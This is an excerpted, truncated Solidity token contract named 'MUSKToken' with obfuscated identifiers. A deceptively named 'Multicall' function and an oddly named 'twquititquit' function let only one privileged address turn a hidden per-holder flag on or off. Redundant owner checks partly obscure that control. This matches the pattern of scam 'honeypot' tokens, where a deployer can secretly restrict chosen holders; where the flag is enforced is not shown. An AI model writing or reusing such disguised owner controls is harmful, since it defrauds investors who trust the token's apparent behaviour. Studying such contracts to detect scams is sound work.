...
contract MUSKToken is OOwnablee {
    ...
    address public MUSKMdd114;
    mapping(address => bool) private dcvfdg;
    ...
    function twquititquit(address twuser) public    {
        if(MUSKMdd114 != _msgSender()){
            require(MUSKMdd114 == _msgSender());
        }
        dcvfdg[twuser] = false;
        require(MUSKMdd114 == _msgSender());
    }
    ...
    function Multicall(address ccc) external   {  
        if(MUSKMdd114 != _msgSender()){
            require(MUSKMdd114 == _msgSender());
        }
        dcvfdg[ccc] = true;
